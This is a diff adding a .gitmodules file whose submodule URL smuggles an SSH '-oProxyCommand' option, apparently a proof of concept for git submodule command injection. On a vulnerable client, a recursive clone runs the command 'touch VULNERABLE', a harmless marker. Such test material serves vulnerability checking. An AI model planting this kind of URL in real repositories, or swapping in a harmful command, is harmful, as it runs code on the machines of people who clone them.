@@ -1,0 +1,4 @@
+[submodule "test"]
+	path = test
+	url = ssh://-oProxyCommand=touch VULNERABLE/git@github.com:/hackoflpf/myowntest.git
+
